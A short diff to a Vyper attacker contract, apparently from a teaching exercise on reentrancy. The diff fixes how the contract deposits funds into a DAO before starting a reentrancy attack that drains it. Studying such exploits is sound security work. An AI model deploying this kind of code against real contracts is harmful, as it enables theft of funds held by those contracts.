@@ -7,7 +7,7 @@ dao_address: public(address)
 owner_address: public(address)
 
 # add a value field
-value: public(uint256)
+# value: public(uint256)
     
     
     
@@ -50,8 +50,8 @@ def attack(dao_address:address):
         deposit_amount = dao_address.balance
     
     # TODO: make the deposit into the DAO   
-    self.value = deposit_amount
-    DAO(self.dao_address).deposit()
+    # self.value = deposit_amount
+    DAO(self.dao_address).deposit(value=deposit_amount)
     
     # TODO: Start the reentrancy attack
     self._attack()
